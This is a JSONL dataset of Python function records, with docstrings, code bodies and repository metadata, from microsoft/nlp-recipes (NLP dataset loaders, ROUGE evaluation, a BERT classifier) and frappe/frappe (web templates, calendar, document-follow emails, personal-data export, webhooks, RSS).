\"/candidate/\"\ntmp_dir_reference = tmp_dir + \"/reference/\"\n\nos.makedirs(tmp_dir_candidate, exist_ok=True)\nos.makedirs(tmp_dir_reference, exist_ok=True)\n\ntry:\n    for i in range(cnt):\n        if len(references[i]) < 1:\n            continue\n        with open(tmp_dir_candidate + \"/cand.{}.txt\".format(i), \"w\", encoding=\"utf-8\") as f:\n            f.write(candidates[i])\n        with open(tmp_dir_reference + \"/ref.{}.txt\".format(i), \"w\", encoding=\"utf-8\") as f:\n            f.write(references[i])\n    r = Rouge155()\n    r.model_dir = tmp_dir_reference\n    r.system_dir = tmp_dir_candidate\n    r.model_filename_pattern = \"ref.#ID#.txt\"\n    r.system_filename_pattern = r\"cand.(\\d+).txt\"\n    rouge_results = r.convert_and_evaluate()\n    if verbose:\n        print(rouge_results)\n    results_dict = r.output_to_dict(rouge_results)\nfinally:\n    if os.path.isdir(tmp_dir):\n        shutil.rmtree(tmp_dir)\nreturn results_dict", "path": "nlp-recipes/utils_nlp/eval/rouge/compute_rouge.py", "commit_date": "2020-01-08 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"Load the STS Benchmark dataset as a pd.DataFrame\n\nArgs:\n    data_path (str): Path to data directory\n    file_split (str, optional): File split to load.\n    One of (train, dev, test).\n    Defaults to train.\n\nReturns:\n    pd.DataFrame: STS Benchmark dataset\n\"\"\"\n", "func_signal": "def load_pandas_df(data_path, file_split=DEFAULT_FILE_SPLIT):\n", "code": "file_name = \"sts-{}.csv\".format(file_split)\ndf = _maybe_download_and_extract(file_name, data_path)\nreturn df", "path": "nlp-recipes/utils_nlp/dataset/stsbenchmark.py", "commit_date": "2019-08-20 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"\nLoads the SNLI dataset as AzureML dataflow object\nDownload the dataset from \"https://nlp.stanford.edu/projects/snli/snli_1.0.zip\", unzip,\nand load.\n\nArgs:\n    local_cache_path (str): Path (directory or a zip file) to cache the downloaded zip file.\n        If None, all the intermediate files will be stored in a temporary directory and removed\n        after use.\n    file_split (str): File split to load. One of (dev, test, train)\n    file_type (str): File type to load. One of (txt, jsonl)\n\nReturns:\n    AzureML dataflow: SNLI dataset\n\n\"\"\"\n", "func_signal": "def load_azureml_df(local_cache_path=None, file_split=Split.TRAIN, file_type=\"txt\"):\n", "code": "with download_path(local_cache_path) as path:\n    filepath = os.path.join(path, \"snli_1.0.zip\")\n    snlipath = _maybe_download_and_extract(filepath, file_split, file_type)\n\n    # NOTE: this works for the txt format but not the jsonl format\n    df = dprep.auto_read_file(snlipath)\n\nreturn df", "path": "nlp-recipes/utils_nlp/dataset/snli.py", "commit_date": "2019-08-20 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"\nLabel encoding from Tree LSTM paper (Tai, Socher, Manning)\n\"\"\"\n", "func_signal": "def encode_labels(self, labels, nclass=5):\n", "code": "Y = np.zeros((len(labels), nclass)).astype('float32')\nfor j, y in enumerate(labels):\n    for i in range(nclass):\n        if i+1 == np.floor(y) + 1:\n            Y[j, i] = y - np.floor(y)\n        if i+1 == np.floor(y):\n            Y[j, i] = np.floor(y) - y + 1\nreturn Y", "path": "nlp-recipes/utils_nlp/eval/SentEval/senteval/sick.py", "commit_date": "2019-08-09 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"Drop columns containing irrelevant metadata and\nsave as new csv files in the target_dir.\n\nArgs:\n    df (pandas.Dataframe): drop columns from train/test/dev files.\n\"\"\"\n", "func_signal": "def clean_sts(df):\n", "code": "clean_df = df.drop([\"column_0\", \"column_1\", \"column_2\", \"column_3\"], axis=1)\nclean_df = clean_df.rename(\n    index=str, columns={\"column_4\": \"score\", \"column_5\": \"sentence1\", \"column_6\": \"sentence2\"}\n)\nreturn clean_df", "path": "nlp-recipes/utils_nlp/dataset/stsbenchmark.py", "commit_date": "2019-08-20 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"Initializes the classifier and the underlying pretrained model.\n\nArgs:\n    language (Language, optional): The pretrained model's language.\n                                   Defaults to Language.ENGLISH.\n    num_labels (int, optional): The number of unique labels in the\n        training data. Defaults to 2.\n    cache_dir (str, optional): Location of BERT's cache directory.\n        Defaults to \".\".\n\"\"\"\n", "func_signal": "def __init__(self, language=Language.ENGLISH, num_labels=2, cache_dir=\".\"):\n", "code": "if num_labels < 2:\n    raise ValueError(\"Number of labels should be at least 2.\")\n\nself.language = language\nself.num_labels = num_labels\nself.cache_dir = cache_dir\n\n# create classifier\nself.model = BertForSequenceClassification.from_pretrained(\n    language, cache_dir=cache_dir, num_labels=num_labels\n)\nself.has_cuda = self.cuda", "path": "nlp-recipes/utils_nlp/models/bert/sequence_classification.py", "commit_date": "2020-02-13 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"\nDownload the SNLI dataset\nArgs:\n    dest_path (str): file path where SNLI dataset should be downloaded\n\nReturns:\n    str: file path where SNLI dataset is downloaded\n\n\"\"\"\n", "func_signal": "def download_snli(dest_path):\n", "code": "dirs, file = os.path.split(dest_path)\nmaybe_download(SNLI_URL, file, work_directory=dirs)", "path": "nlp-recipes/utils_nlp/dataset/snli.py", "commit_date": "2019-08-20 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"Load datafile as dataframe\n\nArgs:\n    src_file_path (str): filepath to train/dev/test csv files.\n\"\"\"\n", "func_signal": "def _load_sts(src_file_path):\n", "code": "with open(src_file_path, \"r\", encoding=\"utf-8\") as f:\n    sent_pairs = []\n    for line in f:\n        line = line.strip().split(\"\\t\")\n        sent_pairs.append(\n            [\n                line[0].strip(),\n                line[1].strip(),\n                line[2].strip(),\n                line[3].strip(),\n                float(line[4]),\n                line[5].strip(),\n                line[6].strip(),\n            ]\n        )\n\n    sdf = pd.DataFrame(\n        sent_pairs,\n        columns=[\n            \"column_0\",\n            \"column_1\",\n            \"column_2\",\n            \"column_3\",\n            \"column_4\",\n            \"column_5\",\n            \"column_6\",\n        ],\n    )\n    return sdf", "path": "nlp-recipes/utils_nlp/dataset/stsbenchmark.py", "commit_date": "2019-08-20 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"Download and extract data from\n    http://ixa2.si.ehu.es/stswiki/images/4/48/Stsbenchmark.tar.gz\n\nArgs:\n    dirpath (str): Path to data directory.\n\nReturns:\n    str: Path to extracted STS Benchmark data.\n\"\"\"\n", "func_signal": "def _download_sts(dirpath):\n", "code": "filepath = maybe_download(STS_URL, work_directory=dirpath)\nextracted_path = _extract_sts(filepath, target_dirpath=dirpath, tmode=\"r:gz\")\nprint(\"Data downloaded to {}\".format(extracted_path))\nreturn extracted_path", "path": "nlp-recipes/utils_nlp/dataset/stsbenchmark.py", "commit_date": "2019-08-20 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"\nLoads the SNLI dataset as pd.DataFrame\nDownload the dataset from \"https://nlp.stanford.edu/projects/snli/snli_1.0.zip\", unzip, and load\n\nArgs:\n    local_cache_path (str): Path (directory or a zip file) to cache the downloaded zip file.\n        If None, all the intermediate files will be stored in a temporary directory and removed\n        after use.\n    file_split (str): File split to load, defaults to \"train\"\n    file_type (str): File type to load, defaults to \"txt\"\n    nrows (int): Number of rows to load, defaults to None (in which all rows will be returned)\n\nReturns:\n    pd.DataFrame: SNLI dataset.\n\"\"\"\n", "func_signal": "def load_pandas_df(local_cache_path=None, file_split=Split.TRAIN, file_type=\"txt\", nrows=None):\n", "code": "with download_path(local_cache_path) as path:\n    filepath = os.path.join(path, \"snli_1.0.zip\")\n    snlipath = _maybe_download_and_extract(filepath, file_split, file_type)\n\n    if file_type == \"txt\":\n        snli_df = pd.read_csv(snlipath, sep=\"\\t\", nrows=nrows)\n    else:\n        snli_df = pd.read_json(snlipath, lines=True)\n        if nrows:\n            snli_df = snli_df[:nrows]\n\nreturn snli_df", "path": "nlp-recipes/utils_nlp/dataset/snli.py", "commit_date": "2019-08-20 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"Drop badly formatted rows from the input dataframe\n\nArgs:\n    df (pd.DataFrame): Input dataframe\n    label_col (str): Name of label column.\n        Defaults to the standardized column name that is set after running the clean_col method.\n\nReturns:\n    pd.DataFrame\n\"\"\"\n", "func_signal": "def clean_rows(df, label_col=LABEL_COL):\n", "code": "snli_df = df.dropna()\nsnli_df = snli_df.loc[snli_df[label_col] != \"-\"].copy()\n\nreturn snli_df", "path": "nlp-recipes/utils_nlp/dataset/snli.py", "commit_date": "2019-08-20 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"\nExtract SNLI datafile from the SNLI raw zip file.\nArgs:\n    zip_path (str): zip file location\n    source_path (str): datafile location\n    dest_path (str): file path for extracted SNLI\n\n\"\"\"\n", "func_signal": "def extract_snli(zip_path, source_path, dest_path):\n", "code": "with ZipFile(zip_path, \"r\") as z:\n    with z.open(source_path) as zf, open(dest_path, \"wb\") as f:\n        shutil.copyfileobj(zf, f)", "path": "nlp-recipes/utils_nlp/dataset/snli.py", "commit_date": "2019-08-20 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"\nComputes ROUGE scores using the python package (https://pypi.org/project/py-rouge/).\n\nArgs:\n    cand (list or str): If `is_input_files` is `False`, `cand` is a list of strings\n        containing predicted summaries. if `is_input_files` is `True`, `cand` is the path\n        to the file containing the predicted summaries.\n    ref (list or str): If `is_input_files` is `False`, `cand` is a list of strings\n        containing reference summaries. if `is_input_files` is `True`, `cand` is the path\n        to the file containing the reference summaries.\n    is_input_files (bool, optional): If True, inputs are file names. Otherwise, inputs are\n        lists of predicted and reference summaries. Defaults to False.\n    language (str, optional): Language of the input text. Supported values are \"en\" and\n        \"hi\". Defaults to \"en\".\n\nReturns:\n    dict: Dictionary of ROUGE scores.\n\n\"\"\"\n", "func_signal": "def compute_rouge_python(cand, ref, is_input_files=False, language=\"en\"):\n", "code": "supported_langauges = [\"en\", \"hi\"]\nif language not in supported_langauges:\n    raise Exception(\n        \"Language {0} is not supported. Supported languages are: {1}.\".format(\n            language, supported_langauges\n        )\n    )\n\nif is_input_files:\n    candidates = [line.strip() for line in open(cand, encoding=\"utf-8\")]\n    references = [line.strip() for line in open(ref, encoding=\"utf-8\")]\nelse:\n    candidates = cand\n    references = ref\n\nprint(\"Number of candidates: {}\".format(len(candidates)))\nprint(\"Number of references: {}\".format(len(references)))\nassert len(candidates) == len(references)\n\nif language == \"en\":\n    evaluator = Rouge(\n        metrics=[\"rouge-n\", \"rouge-l\"], max_n=2, limit_length=False, apply_avg=True\n    )\nelse:\n    evaluator = RougeExt(\n        metrics=[\"rouge-n\", \"rouge-l\"],\n        max_n=2,\n        limit_length=False,\n        apply_avg=True,\n        language=language,\n    )\n\nscores = evaluator.get_scores(candidates, [[it] for it in references])\n\nreturn scores", "path": "nlp-recipes/utils_nlp/eval/rouge/compute_rouge.py", "commit_date": "2020-01-08 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"\nConverts a batch of features to model input format,\nused by Transformer.fine_tune.\n\"\"\"\n", "func_signal": "def get_inputs(cls, batch, device, model_name):\n", "code": "batch = tuple(t.to(device) for t in batch)\ninputs = {\n    \"source_ids\": batch[0],\n    \"target_ids\": batch[1],\n    \"pseudo_ids\": batch[2],\n    \"num_source_tokens\": batch[3],\n    \"num_target_tokens\": batch[4],\n}\nreturn inputs", "path": "nlp-recipes/utils_nlp/models/transformers/abstractive_summarization_seq2seq.py", "commit_date": "2020-05-20 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"\nDownloads SNLI dataset zip and extract provided datafile split if they don\u2019t already exist\nArgs:\n    zip_path (str): Path (directory or a zip file) to cache the downloaded zip file\n    file_split (str): File split to load\n    file_type(str) : File type to load\n\nReturns:\n     str: File path where data file is extracted\n\"\"\"\n", "func_signal": "def _maybe_download_and_extract(zip_path, file_split, file_type):\n", "code": "dirs, _ = os.path.split(zip_path)\nif not os.path.exists(dirs):\n    os.makedirs(dirs)\n\n# store raw data here\ndir_path = os.path.join(dirs, \"raw\", SNLI_DIRNAME)\n\nif not os.path.exists(dir_path):\n    os.makedirs(dir_path)\n\n# format csv filename\nfile_name = \"{0}_{1}.{2}\".format(SNLI_FILE_PREFIX, file_split.value, file_type)\nextract_path = os.path.join(dir_path, file_name)\n\nif not os.path.exists(extract_path):\n    _ = download_snli(zip_path)\n    extract_snli(zip_path, source_path=SNLI_DIRNAME + \"/\" + file_name, dest_path=extract_path)\n\nreturn extract_path", "path": "nlp-recipes/utils_nlp/dataset/snli.py", "commit_date": "2019-08-20 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"Extract data from the sts tar.gz archive\n\nArgs:\n    tarpath (str): Path to tarfile, to be deleted after extraction.\n    target_dirpath (str, optional): Directory in which to save\n        the extracted files.\n    tmode (str, optional): The mode for reading,\n        of the form \"filemode[:compression]\".\n    Defaults to \"r\".\n\nReturns:\n    str: Path to extracted STS Benchmark data.\n\"\"\"\n", "func_signal": "def _extract_sts(tarpath, target_dirpath=\".\", tmode=\"r\"):\n", "code": "with tarfile.open(tarpath, mode=tmode) as t:\n    t.extractall(target_dirpath)\n    extracted = t.getnames()[0]\nos.remove(tarpath)\nreturn os.path.join(target_dirpath, extracted)", "path": "nlp-recipes/utils_nlp/dataset/stsbenchmark.py", "commit_date": "2019-08-20 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"Loads the SQuAD dataset in pandas data frame.\n\nArgs:\n    local_cache_path (str, optional): Path to load the data from. If the file doesn't exist,\n        download it first. Defaults to the current directory.\n    squad_version (str, optional): Version of the SQuAD dataset, accepted values are: \n        \"v1.1\" and \"v2.0\". Defaults to \"v1.1\".\n    file_split (str, optional): Dataset split to load, accepted values are: \"train\" and \"dev\".\n        Defaults to \"train\".\n\"\"\"\n\n", "func_signal": "def load_pandas_df(local_cache_path=\".\", squad_version=\"v1.1\", file_split=\"train\"):\n", "code": "if file_split not in [\"train\", \"dev\"]:\n    raise ValueError(\"file_split should be either train or dev\")\n\nURL = URL_DICT[squad_version][file_split]\nfile_name = URL.split(\"/\")[-1]\nmaybe_download(URL, file_name, local_cache_path)\n\nfile_path = os.path.join(local_cache_path, file_name)\n\nwith open(file_path, \"r\", encoding=\"utf-8\") as reader:\n    input_data = json.load(reader)[\"data\"]\n\nparagraph_text_list = []\nquestion_text_list = []\nanswer_start_list = []\nanswer_text_list = []\nqa_id_list = []\nis_impossible_list = []\nfor entry in input_data:\n    for paragraph in entry[\"paragraphs\"]:\n        paragraph_text = paragraph[\"context\"]\n\n        for qa in paragraph[\"qas\"]:\n            qas_id = qa[\"id\"]\n            question_text = qa[\"question\"]\n            answer_offset = None\n            is_impossible = False\n\n            if squad_version == \"v2.0\":\n                is_impossible = qa[\"is_impossible\"]\n\n            if file_split == \"train\":\n                if (len(qa[\"answers\"]) != 1) and (not is_impossible):\n                    raise ValueError(\n                        \"For training, each question should have exactly 1 answer.\"\n                    )\n                if not is_impossible:\n                    answer = qa[\"answers\"][0]\n                    orig_answer_text = answer[\"text\"]\n                    answer_offset = answer[\"answer_start\"]\n                else:\n                    orig_answer_text = \"\"\n            else:\n                if not is_impossible:\n                    orig_answer_text = []\n                    answer_offset = []\n                    for answer in qa[\"answers\"]:\n                        orig_answer_text.append(answer[\"text\"])\n                        answer_offset.append(answer[\"answer_start\"])\n                else:\n                    orig_answer_text = \"\"\n\n            paragraph_text_list.append(paragraph_text)\n            question_text_list.append(question_text)\n            answer_start_list.append(answer_offset)\n            answer_text_list.append(orig_answer_text)\n            qa_id_list.append(qas_id)\n            is_impossible_list.append(is_impossible)\n\noutput_df = pd.DataFrame(\n    {\n        \"doc_text\": paragraph_text_list,\n        \"question_text\": question_text_list,\n        \"answer_start\": answer_start_list,\n        \"answer_text\": answer_text_list,\n        \"qa_id\": qa_id_list,\n        \"is_impossible\": is_impossible_list,\n    }\n)\n\nreturn output_df", "path": "nlp-recipes/utils_nlp/dataset/squad.py", "commit_date": "2019-10-23 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"\nDrop irrelevant columns from the input dataframe\nArgs:\n    df(pd.DataFrame): Input dataframe\n\nReturns:\n    pd.DataFrame\n\"\"\"\n", "func_signal": "def clean_cols(df):\n", "code": "snli_df = df.drop(\n    [\n        \"sentence1_binary_parse\",\n        \"sentence2_binary_parse\",\n        \"sentence1_parse\",\n        \"sentence2_parse\",\n        \"captionID\",\n        \"pairID\",\n        \"label1\",\n        \"label2\",\n        \"label3\",\n        \"label4\",\n        \"label5\",\n    ],\n    axis=1,\n)\n\nsnli_df = snli_df.rename(\n    columns={\"sentence1\": S1_COL, \"sentence2\": S2_COL, \"gold_label\": LABEL_COL}\n)\n\nreturn snli_df", "path": "nlp-recipes/utils_nlp/dataset/snli.py", "commit_date": "2019-08-20 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"Calcualtes n-grams.\nArgs:\n  n: which n-grams to calculate\n  text: An array of tokens\nReturns:\n  A set of n-grams\n\"\"\"\n", "func_signal": "def _get_ngrams(n, text):\n", "code": "ngram_set = set()\ntext_length = len(text)\nmax_index_ngram_start = text_length - n\nfor i in range(max_index_ngram_start + 1):\n    ngram_set.add(tuple(text[i:i + n]))\nreturn ngram_set", "path": "nlp-recipes/utils_nlp/dataset/sentence_selection.py", "commit_date": "2019-12-13 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\" cache the output of torch.cuda.is_available() \"\"\"\n\n", "func_signal": "def cuda(self):\n", "code": "self.has_cuda = torch.cuda.is_available()\nreturn self.has_cuda", "path": "nlp-recipes/utils_nlp/models/bert/sequence_classification.py", "commit_date": "2020-02-13 00:00:00", "repo_name": "microsoft/nlp-recipes", "stars": 6313, "license": "mit", "language": "python", "size": 48731}
{"docstring": "\"\"\"Export Web Template to a new folder.\n\nDoc is exported as JSON. The content of the `template` field gets\nwritten into a separate HTML file. The template should not be contained\nin the JSON.\n\"\"\"\n", "func_signal": "def export_to_files(self):\n", "code": "html, self.template = self.template, \"\"\nwrite_document_file(self, create_init=True)\nself.create_template_file(html)", "path": "frappe/frappe/website/doctype/web_template/web_template.py", "commit_date": "2020-11-05 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "\"\"\"Get the jinja template string.\n\nParams:\nstandard - if True, look on the disk instead of in the database.\n\"\"\"\n", "func_signal": "def get_template(self, standard=False):\n", "code": "if standard:\n\ttemplate = self.get_template_path()\n\twith open(template, \"r\") as template_file:\n\t\ttemplate = template_file.read()\nelse:\n\ttemplate = self.template\n\nreturn template", "path": "frappe/frappe/website/doctype/web_template/web_template.py", "commit_date": "2020-11-05 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "'''\n\tparam:\n\tfrequency for sanding mails\n\n\ttask:\n\tset receiver according to frequency\n\tgroup document list according to user\n\tget changes, activity, comments on doctype\n\tcall method to send mail\n'''\n\n", "func_signal": "def send_document_follow_mails(frequency):\n", "code": "users = frappe.get_list(\"Document Follow\",\n\tfields=[\"*\"])\n\nsorted_users = sorted(users, key=lambda k: k['user'])\n\ngrouped_by_user = {}\nfor k, v in groupby(sorted_users, key=lambda k: k['user']):\n\tgrouped_by_user[k] = list(v)\n\nfor user in grouped_by_user:\n\tuser_frequency = frappe.db.get_value(\"User\", user, \"document_follow_frequency\")\n\tmessage = []\n\tvalid_document_follows = []\n\tif user_frequency == frequency:\n\t\tfor d in grouped_by_user[user]:\n\t\t\tcontent = get_message(d.ref_docname, d.ref_doctype, frequency, user)\n\t\t\tif content:\n\t\t\t\tmessage = message + content\n\t\t\t\tvalid_document_follows.append({\n\t\t\t\t\t\"reference_docname\": d.ref_docname,\n\t\t\t\t\t\"reference_doctype\": d.ref_doctype,\n\t\t\t\t\t\"reference_url\": get_url_to_form(d.ref_doctype, d.ref_docname)\n\t\t\t\t})\n\n\t\tif message and frappe.db.get_value(\"User\", user, \"document_follow_notify\", ignore=True):\n\t\t\tsend_email_alert(user, valid_document_follows, message)", "path": "frappe/frappe/desk/form/document_follow.py", "commit_date": "2020-12-03 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "\"\"\"\n   Load the page from `frappe.form` and send it via `frappe.response`\n\"\"\"\n", "func_signal": "def getpage():\n", "code": "page = frappe.form_dict.get('name')\ndoc = get(page)\n\n# load translations\nif frappe.lang != \"en\":\n\tsend_translations(frappe.get_lang_dict(\"page\", page))\n\nfrappe.response.docs.append(doc)", "path": "frappe/frappe/desk/desk_page.py", "commit_date": "2017-06-19 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "'''Return query string arg.'''\n", "func_signal": "def get_query_key():\n", "code": "query_string = frappe.local.request.query_string\nquery = dict(parse_qsl(query_string))\nquery = {key.decode(): val.decode() for key, val in query.items()}\nif not 'k' in list(query):\n\tfrappe.throw(_('Not Permitted'),frappe.PermissionError)\nquery = (query['k']).strip()\nif False in [i.isalpha() or i.isdigit() for i in query]:\n\tfrappe.throw(_('Not Permitted'),frappe.PermissionError)\nreturn query", "path": "frappe/frappe/www/qrcode.py", "commit_date": "2019-08-11 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "\"\"\"update the output field with the response along with the relevant status\"\"\"\n", "func_signal": "def handle_success(self, response):\n", "code": "if isinstance(response, string_types):\n\tresponse = json.loads(response)\nself.db_set(\"status\", \"Completed\")\nself.db_set(\"output\", json.dumps(response, default=json_handler))", "path": "frappe/frappe/integrations/doctype/integration_request/integration_request.py", "commit_date": "2020-10-15 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "\"\"\"generate the file link for download\"\"\"\n", "func_signal": "def generate_file_and_send_mail(self, personal_data):\n", "code": "user_name = self.user_name.replace(' ','-')\nf = frappe.get_doc({\n\t'doctype': 'File',\n\t'file_name': 'Personal-Data-'+user_name+'-'+self.name+'.json',\n\t\"attached_to_doctype\": 'Personal Data Download Request',\n\t\"attached_to_name\": self.name,\n\t'content': str(personal_data),\n\t'is_private': 1\n})\nf.save(ignore_permissions=True)\n\nfile_link = frappe.utils.get_url(\"/api/method/frappe.core.doctype.file.file.download_file\") +\\\n\t\"?\" + get_signed_params({\"file_url\": f.file_url})\nhost_name = frappe.local.site\nfrappe.sendmail(\n\trecipients=self.user,\n\tsubject=_(\"Download Your Data\"),\n\ttemplate=\"download_data\",\n\targs={\n\t\t'user': self.user,\n\t\t'user_name': self.user_name,\n\t\t'link': file_link,\n\t\t'host_name': host_name\n\t},\n\theader=[_(\"Download Your Data\"), \"green\"]\n)", "path": "frappe/frappe/website/doctype/personal_data_download_request/personal_data_download_request.py", "commit_date": "2019-07-30 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "\"\"\"Returns SQL conditions with user permissions and filters for event queries\"\"\"\n", "func_signal": "def get_event_conditions(doctype, filters=None):\n", "code": "from frappe.desk.reportview import get_filters_cond\nif not frappe.has_permission(doctype):\n\tfrappe.throw(_(\"Not Permitted\"), frappe.PermissionError)\n\nreturn get_filters_cond(doctype, filters, [], with_match_conditions = True)", "path": "frappe/frappe/desk/calendar.py", "commit_date": "2018-09-21 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "\"\"\"generate rss feed\"\"\"\n\n", "func_signal": "def get_context(context):\n", "code": "host = get_request_site_address()\n\nblog_list = frappe.db.sql(\"\"\"\\\n\tselect route as name, published_on, modified, title, content from `tabBlog Post`\n\twhere ifnull(published,0)=1\n\torder by published_on desc limit 20\"\"\", as_dict=1)\n\nfor blog in blog_list:\n\tblog_page = cstr(quote(blog.name.encode(\"utf-8\")))\n\tblog.link = urljoin(host, blog_page)\n\tblog.content = escape_html(blog.content or \"\")\n\nif blog_list:\n\tmodified = max((blog['modified'] for blog in blog_list))\nelse:\n\tmodified = now()\n\nblog_settings = frappe.get_doc('Blog Settings', 'Blog Settings')\n\ncontext = {\n\t'title': blog_settings.blog_title or \"Blog\",\n\t'description': blog_settings.blog_introduction or \"\",\n\t'modified': modified,\n\t'items': blog_list,\n\t'link': host + '/blog'\n}\n\n# print context\nreturn context", "path": "frappe/frappe/www/rss.py", "commit_date": "2019-01-23 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "\"\"\"Touch a HTML file for the Web Template and add existing content, if any.\"\"\"\n", "func_signal": "def create_template_file(self, html=None):\n", "code": "if self.standard:\n\tpath = self.get_template_path()\n\tif not os.path.exists(path):\n\t\twith open(path, \"w\") as template_file:\n\t\t\tif html:\n\t\t\t\ttemplate_file.write(html)", "path": "frappe/frappe/website/doctype/web_template/web_template.py", "commit_date": "2020-11-05 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "\"\"\"Return the absolute path to the template's HTML file.\"\"\"\n", "func_signal": "def get_template_path(self):\n", "code": "folder = self.get_template_folder()\nfile_name = frappe.scrub(self.name) + \".html\"\n\nreturn os.path.join(folder, file_name)", "path": "frappe/frappe/website/doctype/web_template/web_template.py", "commit_date": "2020-11-05 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "\"\"\" returns user data not linked to User doctype \"\"\"\n", "func_signal": "def get_user_data(user):\n", "code": "hooks = frappe.get_hooks(\"user_privacy_documents\")\ndata = {}\nfor hook in hooks:\n\td = data.get(hook.get('doctype'),[])\n\td += frappe.get_all(hook.get('doctype'), {hook.get('match_field'): user}, [\"*\"])\n\tif d:\n\t\tdata.update({ hook.get('doctype'):d })\nreturn json.dumps(data, indent=2, default=str)", "path": "frappe/frappe/website/doctype/personal_data_download_request/personal_data_download_request.py", "commit_date": "2019-07-30 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "# retrieve or create a User webhook for `after_insert`\n", "func_signal": "def setUp(self):\n", "code": "webhook_fields = {\n\t\"webhook_doctype\": \"User\",\n\t\"webhook_docevent\": \"after_insert\",\n\t\"request_url\": \"https://httpbin.org/post\"\n}\n\nif frappe.db.exists(\"Webhook\", webhook_fields):\n\tself.webhook = frappe.get_doc(\"Webhook\", webhook_fields)\nelse:\n\tself.webhook = frappe.new_doc(\"Webhook\")\n\tself.webhook.update(webhook_fields)\n\n# create a User document\nself.user = frappe.new_doc(\"User\")\nself.user.first_name = frappe.mock(\"name\")\nself.user.email = frappe.mock(\"email\")\nself.user.save()", "path": "frappe/frappe/integrations/doctype/webhook/test_webhook.py", "commit_date": "2019-08-28 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "\"\"\"Updates Event (called via calendar) based on passed `field_map`\"\"\"\n", "func_signal": "def update_event(args, field_map):\n", "code": "args = frappe._dict(json.loads(args))\nfield_map = frappe._dict(json.loads(field_map))\nw = frappe.get_doc(args.doctype, args.name)\nw.set(field_map.start, args[field_map.start])\nw.set(field_map.end, args.get(field_map.end))\nw.save()", "path": "frappe/frappe/desk/calendar.py", "commit_date": "2018-09-21 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
{"docstring": "\"\"\"Import, overwrite fixtures from `[app]/fixtures`\"\"\"\n", "func_signal": "def sync_dashboards(app=None):\n", "code": "if not cint(frappe.db.get_single_value('System Settings', 'setup_complete')):\n\treturn\nif app:\n\tapps = [app]\nelse:\n\tapps = frappe.get_installed_apps()\n\nfor app_name in apps:\n\tprint(\"Updating Dashboard for {app}\".format(app=app_name))\n\tfor module_name in frappe.local.app_modules.get(app_name) or []:\n\t\tfrappe.flags.in_import = True\n\t\tmake_records_in_module(app_name, module_name)\n\t\tfrappe.flags.in_import = False", "path": "frappe/frappe/utils/dashboard.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "frappe/frappe", "stars": 6325, "license": "mit", "language": "python", "size": 377118}
